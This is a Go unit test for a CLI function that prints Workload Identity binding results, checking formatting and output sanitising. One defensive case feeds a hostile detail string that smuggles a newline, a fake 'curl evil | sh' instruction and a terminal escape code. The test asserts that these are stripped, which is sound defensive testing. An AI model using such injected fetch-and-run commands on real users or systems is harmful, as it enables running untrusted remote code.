// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package cmd

import (
	"bytes"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"

	"github.com/GoogleCloudPlatform/scion/pkg/api"
)

func TestPrintWorkloadIdentityBindings(t *testing.T) {
	var none bytes.Buffer
	printWorkloadIdentityBindings(&none, nil)
	assert.Empty(t, none.String(), "nothing when the hub reports no bindings")

	var buf bytes.Buffer
	printWorkloadIdentityBindings(&buf, []api.WorkloadIdentityBinding{
		{Member: "serviceAccount:p.svc.id.goog[agents/scion-foo]", Profiles: []string{"a/gke"}, State: api.WorkloadIdentityBindingBound},
		{Member: "serviceAccount:q.svc.id.goog[agents/scion-foo]", Profiles: []string{"b/gke"}, State: api.WorkloadIdentityBindingSkipped,
			Reason: api.WorkloadIdentityReasonPoolNotFound, Detail: "IAM does not know the pool", ManualStep: "gcloud iam service-accounts add-iam-policy-binding x"},
		{Profiles: []string{"old/k8s"}, State: api.WorkloadIdentityBindingSkipped, Reason: api.WorkloadIdentityReasonNoPool, ManualStep: "gcloud y"},
	})
	out := buf.String()
	assert.Contains(t, out, "Workload Identity bindings:")
	assert.Contains(t, out, "    bound    serviceAccount:p.svc.id.goog[agents/scion-foo] (a/gke)\n")
	assert.Contains(t, out, "    skipped  serviceAccount:q.svc.id.goog[agents/scion-foo] (b/gke): pool_not_found - IAM does not know the pool\n")
	assert.Contains(t, out, "to grant it by hand: gcloud iam service-accounts add-iam-policy-binding x\n")
	assert.Contains(t, out, "    skipped  old/k8s: no_workload_identity_pool\n")
	assert.Contains(t, out, "can take a few minutes")

	var hostile bytes.Buffer
	printWorkloadIdentityBindings(&hostile, []api.WorkloadIdentityBinding{
		{Member: "m", State: api.WorkloadIdentityBindingFailed, Reason: "iam_error",
			Detail: "x\n             to grant it by hand: curl evil | sh\x1b[2K", ManualStep: "gcloud ok"},
	})
	assert.Equal(t, 3, strings.Count(hostile.String(), "\n"), "header, entry and manual step lines only: %q", hostile.String())
	assert.NotContains(t, hostile.String(), "\x1b")
}
